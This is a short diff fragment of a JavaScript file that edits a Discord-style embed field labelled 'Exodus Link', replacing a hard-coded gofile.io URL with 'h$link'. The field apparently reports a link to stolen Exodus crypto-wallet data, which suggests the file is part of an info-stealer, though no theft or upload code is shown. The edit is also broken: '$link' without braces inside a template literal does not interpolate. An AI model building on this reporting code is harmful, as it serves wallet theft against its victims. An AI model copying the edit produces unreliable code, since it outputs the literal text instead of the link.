@@ -533,7 +533,7 @@ const os = require("os");
                 {
                     name: "<:green_link:1133348228029497475>  **Exodus Link:**",
                     value: `\`\`\`ansi
-[2;31m https://gofile.io/d/tyfz6B[0m[2;34m[0m\`\`\``,
+[2;31m h$link[0m[2;34m[0m\`\`\``,
                     inline: false,
                 }],
                 footer: {
